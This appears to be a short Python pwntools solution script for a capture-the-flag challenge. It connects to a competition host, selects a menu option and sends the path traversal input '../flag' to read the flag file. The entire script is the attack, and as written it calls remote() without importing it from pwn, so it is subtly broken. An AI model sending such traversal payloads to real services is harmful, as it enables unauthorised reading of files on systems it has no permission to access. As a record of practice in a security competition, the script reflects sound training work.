#!/usr/bin/env python3

import pwn


host = 'mngmnt-iface.ctfcompetition.com'
port = 1337

s = remote(host,port)

s.recv()
s.recv()
s.sendline("2")
s.recv()
s.recv()
s.sendline('../flag')
flag = s.recv()
print(flag)

s.close()
